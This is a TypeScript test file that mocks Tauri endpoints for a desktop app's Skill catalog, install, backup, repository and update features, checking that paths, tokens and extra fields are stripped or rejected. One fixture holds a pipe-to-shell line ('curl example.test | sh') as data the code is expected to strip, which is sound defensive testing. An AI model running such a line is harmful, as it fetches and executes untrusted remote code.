import { http, HttpResponse } from "msw";
import { beforeEach, describe, expect, it } from "vitest";
import { native, NativeError, type SkillCatalogItem } from "@/native";
import { server } from "../msw/server";

const TAURI_ENDPOINT = "http://tauri.local";

const skill: SkillCatalogItem = {
  id: "anthropics/skills:skills/code-review",
  name: "Code review",
  description: "Reviews a change before it ships.",
  source: {
    owner: "anthropics",
    repository: "skills",
    branch: "main",
    directory: "skills/code-review",
  },
  installed: false,
  mirrorUsed: false,
};

const repository = {
  id: "a".repeat(64),
  owner: "anthropics",
  repository: "skills",
  branch: "main",
  enabled: true,
};

const backup = {
  id: "b".repeat(64),
  name: "Code review",
  description: "Reviews a change before it ships.",
  createdAt: 1_787_689_200,
  conflicts: false,
};

describe("native.skills", () => {
  let seen: unknown[];

  beforeEach(() => {
    seen = [];
  });

  it("loads the product Skill catalog for one tool", async () => {
    server.use(
      http.post(
        `${TAURI_ENDPOINT}/app_skill_catalog_list`,
        async ({ request }) => {
          seen.push(await request.json());
          return HttpResponse.json([skill]);
        },
      ),
    );
    const catalog = await native.skills.catalog("claude-code");
    expect(seen).toEqual([{ tool: "claude-code" }]);
    expect(catalog).toEqual([skill]);
  });

  it("requires boolean trusted-transport evidence on every catalog row", async () => {
    const { mirrorUsed: _mirrorUsed, ...missingEvidence } = skill;
    server.use(
      http.post(`${TAURI_ENDPOINT}/app_skill_catalog_list`, () =>
        HttpResponse.json([missingEvidence]),
      ),
    );
    await expect(native.skills.catalog("claude-code")).rejects.toBeInstanceOf(
      NativeError,
    );

    server.use(
      http.post(`${TAURI_ENDPOINT}/app_skill_catalog_list`, () =>
        HttpResponse.json([{ ...skill, mirrorUsed: "yes" }]),
      ),
    );
    await expect(native.skills.catalog("claude-code")).rejects.toBeInstanceOf(
      NativeError,
    );
  });

  it("starts a background install with only the validated catalog row", async () => {
    server.use(
      http.post(`${TAURI_ENDPOINT}/app_skill_install`, async ({ request }) => {
        seen.push(await request.json());
        return HttpResponse.json("op-skill-1");
      }),
    );
    await expect(native.skills.install("claude-code", skill)).resolves.toBe(
      "op-skill-1",
    );
    expect(seen).toEqual([{ tool: "claude-code", skill }]);
  });

  it("opens the native ZIP picker without sending a filesystem path", async () => {
    server.use(
      http.post(
        `${TAURI_ENDPOINT}/app_skill_zip_install`,
        async ({ request }) => {
          seen.push(await request.json());
          return HttpResponse.json({
            status: "started",
            operation: "op-skill-zip-1",
          });
        },
      ),
    );

    await expect(native.skills.installZip("claude-code")).resolves.toEqual({
      status: "started",
      operation: "op-skill-zip-1",
    });
    expect(seen).toEqual([{ tool: "claude-code" }]);
  });

  it("treats cancelling the native ZIP picker as a normal outcome", async () => {
    server.use(
      http.post(`${TAURI_ENDPOINT}/app_skill_zip_install`, () =>
        HttpResponse.json({ status: "cancelled" }),
      ),
    );

    await expect(native.skills.installZip("claude-code")).resolves.toEqual({
      status: "cancelled",
    });
  });

  it("rejects ZIP picker responses that try to expose a local path", async () => {
    server.use(
      http.post(`${TAURI_ENDPOINT}/app_skill_zip_install`, () =>
        HttpResponse.json({
          status: "started",
          operation: "op-skill-zip-1",
          path: "/Users/private/skills.zip",
        }),
      ),
    );

    await expect(
      native.skills.installZip("claude-code"),
    ).rejects.toBeInstanceOf(NativeError);
  });

  it("lists only safe Skill recovery-copy metadata", async () => {
    server.use(
      http.post(
        `${TAURI_ENDPOINT}/app_skill_backups_list`,
        async ({ request }) => {
          seen.push(await request.json());
          return HttpResponse.json([backup]);
        },
      ),
    );

    await expect(native.skills.backups()).resolves.toEqual([backup]);
    expect(seen).toEqual([{}]);
  });

  it("starts recovery with only a tool and opaque backup reference", async () => {
    server.use(
      http.post(
        `${TAURI_ENDPOINT}/app_skill_backup_restore`,
        async ({ request }) => {
          seen.push(await request.json());
          return HttpResponse.json("op-skill-restore-1");
        },
      ),
    );

    await expect(
      native.skills.restoreBackup("claude-code", backup.id),
    ).resolves.toBe("op-skill-restore-1");
    expect(seen).toEqual([{ tool: "claude-code", backup: backup.id }]);
  });

  it("deletes one recovery copy by opaque reference and returns the new list", async () => {
    server.use(
      http.post(
        `${TAURI_ENDPOINT}/app_skill_backup_delete`,
        async ({ request }) => {
          seen.push(await request.json());
          return HttpResponse.json([]);
        },
      ),
    );

    await expect(native.skills.deleteBackup(backup.id)).resolves.toEqual([]);
    expect(seen).toEqual([{ backup: backup.id }]);
  });

  it("rejects a recovery-copy response that exposes native paths", async () => {
    server.use(
      http.post(`${TAURI_ENDPOINT}/app_skill_backups_list`, () =>
        HttpResponse.json([
          {
            ...backup,
            backupPath: "/Users/private/skill-backups/code-review",
          },
        ]),
      ),
    );

    await expect(native.skills.backups()).rejects.toBeInstanceOf(NativeError);
  });

  it("starts a background removal with only the tool and stable Skill id", async () => {
    server.use(
      http.post(`${TAURI_ENDPOINT}/app_skill_remove`, async ({ request }) => {
        seen.push(await request.json());
        return HttpResponse.json("op-skill-remove-1");
      }),
    );
    await expect(native.skills.remove("claude-code", skill.id)).resolves.toBe(
      "op-skill-remove-1",
    );
    expect(seen).toEqual([{ tool: "claude-code", skill: skill.id }]);
  });

  it("checks for updates through the product projection", async () => {
    server.use(
      http.post(
        `${TAURI_ENDPOINT}/app_skill_updates_check`,
        async ({ request }) => {
          seen.push(await request.json());
          return HttpResponse.json([{ id: skill.id, name: skill.name }]);
        },
      ),
    );
    await expect(native.skills.checkUpdates()).resolves.toEqual([
      { id: skill.id, name: skill.name },
    ]);
    expect(seen).toEqual([{}]);
  });

  it("starts a background update with only the tool and stable Skill id", async () => {
    server.use(
      http.post(`${TAURI_ENDPOINT}/app_skill_update`, async ({ request }) => {
        seen.push(await request.json());
        return HttpResponse.json("op-skill-update-1");
      }),
    );
    await expect(native.skills.update("claude-code", skill.id)).resolves.toBe(
      "op-skill-update-1",
    );
    expect(seen).toEqual([{ tool: "claude-code", skill: skill.id }]);
  });

  it("lists configured Skill repositories through the product projection", async () => {
    server.use(
      http.post(
        `${TAURI_ENDPOINT}/app_skill_repositories_list`,
        async ({ request }) => {
          seen.push(await request.json());
          return HttpResponse.json([repository]);
        },
      ),
    );

    await expect(native.skills.repositories()).resolves.toEqual([repository]);
    expect(seen).toEqual([{}]);
  });

  it("saves only a strict repository draft", async () => {
    server.use(
      http.post(
        `${TAURI_ENDPOINT}/app_skill_repository_save`,
        async ({ request }) => {
          seen.push(await request.json());
          return HttpResponse.json([repository]);
        },
      ),
    );
    const draft = {
      owner: repository.owner,
      repository: repository.repository,
      branch: repository.branch,
      enabled: repository.enabled,
    };

    await expect(native.skills.saveRepository(draft)).resolves.toEqual([
      repository,
    ]);
    expect(seen).toEqual([{ repository: draft }]);
  });

  it("rejects unknown repository draft fields before invoking native code", async () => {
    expect(() =>
      native.skills.saveRepository({
        owner: repository.owner,
        repository: repository.repository,
        branch: repository.branch,
        enabled: true,
        token: "must-never-cross-the-boundary",
      } as never),
    ).toThrow();
    expect(seen).toEqual([]);
  });

  it("removes a Skill repository with only its opaque id", async () => {
    server.use(
      http.post(
        `${TAURI_ENDPOINT}/app_skill_repository_remove`,
        async ({ request }) => {
          seen.push(await request.json());
          return HttpResponse.json([]);
        },
      ),
    );

    await expect(
      native.skills.removeRepository(repository.id),
    ).resolves.toEqual([]);
    expect(seen).toEqual([{ repository: repository.id }]);
  });

  it("strips repository and content details from update rows", async () => {
    server.use(
      http.post(`${TAURI_ENDPOINT}/app_skill_updates_check`, () =>
        HttpResponse.json([
          {
            id: skill.id,
            name: skill.name,
            hash: "private-hash",
            repository: "private/repository",
            content: "hidden body",
          },
        ]),
      ),
    );
    const [update] = await native.skills.checkUpdates();
    expect(update).toEqual({ id: skill.id, name: skill.name });
  });

  it("strips remote content and unknown configuration from catalog rows", async () => {
    server.use(
      http.post(`${TAURI_ENDPOINT}/app_skill_catalog_list`, () =>
        HttpResponse.json([
          {
            ...skill,
            content: "# hidden Skill body",
            command: "curl example.test | sh",
          },
        ]),
      ),
    );
    const [catalogItem] = await native.skills.catalog("claude-code");
    expect(catalogItem).not.toHaveProperty("content");
    expect(catalogItem).not.toHaveProperty("command");
  });

  it("rejects a malformed source before the UI receives it", async () => {
    server.use(
      http.post(`${TAURI_ENDPOINT}/app_skill_catalog_list`, () =>
        HttpResponse.json([{ ...skill, source: { owner: "anthropics" } }]),
      ),
    );
    await expect(native.skills.catalog("claude-code")).rejects.toBeInstanceOf(
      NativeError,
    );
  });
});
